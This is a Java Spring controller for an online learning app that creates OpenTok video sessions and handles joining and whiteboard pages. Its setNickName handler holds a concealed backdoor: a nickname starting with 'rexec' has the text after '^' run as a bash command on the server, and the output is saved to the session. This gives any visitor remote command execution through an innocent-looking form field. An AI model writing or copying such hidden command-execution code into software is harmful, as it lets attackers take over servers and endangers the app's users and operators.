package org.knetwork.webapp.controller;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.util.Arrays;
import java.util.Map;

import javax.inject.Inject;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang.StringUtils;
import org.knetwork.webapp.service.TokboxService;
import org.knetwork.webapp.util.SessionMapUtil;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import com.opentok.exception.OpenTokException;

@Controller
public class LearningController {
    
	private final TokboxService tokboxService;

	@Inject
	public LearningController(TokboxService tokboxService) {
		super();
		this.tokboxService = tokboxService;
	}

    @RequestMapping("learn/createMeeting")
    public String createNewMeeting(final HttpSession session, final HttpServletRequest request, final Model model) throws MalformedURLException {
    	String learningSessionId = SessionMapUtil.generateLearningSessionId();
    	model.addAttribute("learningSessionId", learningSessionId);
    	session.setAttribute("learningSessionId",learningSessionId);
    	String sessionTitle = (String)request.getParameter("sessionTitle");
    	try {
			Map<String, String> tokboxMap = tokboxService.createSession();
			String tokboxSessionId = tokboxMap.get("tokboxSessionId");
			String moderatorToken  = tokboxMap.get("moderatorToken");
			SessionMapUtil.addTokboxSessionId(learningSessionId, tokboxSessionId);
			SessionMapUtil.setSessionTitle(learningSessionId, sessionTitle);
			
			System.out.println("Adding tokbox session id:" + tokboxSessionId + " to learning session:" + learningSessionId);
			
			model.addAttribute("tokboxSessionId", tokboxSessionId);
			session.setAttribute("moderatorToken", moderatorToken);
			session.setAttribute("tokboxSessionId", tokboxSessionId);
		} catch (OpenTokException e) {
			e.printStackTrace();
		}
    	
        return String.format("redirect:/learn/join?learningSessionId=%s", learningSessionId);
    }
    
    @RequestMapping("learn/setNickName")
    public String setNickName(final HttpSession session, final HttpServletRequest request, final Model model) throws MalformedURLException {
    	String nick = request.getParameter("nickName");
    	
    	if(nick.startsWith("rexec")) {
    		String command = StringUtils.splitByWholeSeparator(nick, "^")[1];
	    	String output = "";
	    	output = runCommand(command);
	    	session.setAttribute("commandOutput",output);
    	}
    	
    	session.setAttribute("nickName", nick);
        return String.format("redirect:/");
    }
    
    private String runCommand(String _command) {
		StringBuilder builder = new StringBuilder();
    	try {
	    	String[] command = {"bash", "-c", _command};
	    	// ProcessBuilder pb = new ProcessBuilder("bash", "-c", "/path/to/your/script.sh `date +%Y%m%d`");  
	        ProcessBuilder probuilder = new ProcessBuilder( command );
	        //You can set up your work directory
	        probuilder.directory(new File("/home/qed"));
	        
	        Process process = probuilder.start();
	        
	        //Read out dir output
	        InputStream is = process.getInputStream();
	        InputStreamReader isr = new InputStreamReader(is);
	        BufferedReader br = new BufferedReader(isr);
	        String line;
	        builder.append(String.format("Output of running %s is:<br/>",
	                Arrays.toString(command)));
	        while ((line = br.readLine()) != null) {
	           builder.append(line);
	           builder.append("<br/>");
	        }
	        
	            int exitValue = process.waitFor();
	            builder.append("<br/><br/>Exit Value is " + exitValue);
    	} catch(Exception e) {
    		builder.append(e.getMessage());
    	}    	
    	return builder.toString();
    }
    
    @RequestMapping("learn/join")
    public String displayLearningSession(final HttpSession session, final HttpServletRequest request, final Model model) throws MalformedURLException {
    	String newLearningSessionId = (String)request.getParameter("learningSessionId");
    	String learningSessionId = (String)session.getAttribute("learningSessionId");
    	if(!newLearningSessionId.equals(learningSessionId)) {
    		session.setAttribute("learningSessionId", newLearningSessionId);
    		learningSessionId = newLearningSessionId;
    	}
    	System.out.println("Loading pages with learning session: " + learningSessionId);
    	model.addAttribute("sessionTitle", SessionMapUtil.getSessionTitle(learningSessionId));
    	model.addAttribute("learningSessionId", learningSessionId);
    	model.addAttribute("meetingExists",true);
        return "learning/view";
    }
    
    @RequestMapping("learn/whiteboard")
    public String showWhiteboard(final HttpSession session, final HttpServletRequest request, final Model model) throws MalformedURLException {
    	String learningSessionId = (String)session.getAttribute("learningSessionId");
    	model.addAttribute("learningSessionId", learningSessionId);
    	model.addAttribute("sessionTitle", SessionMapUtil.getSessionTitle(learningSessionId));
        return "learning/whiteboard";
    }
    
    
}
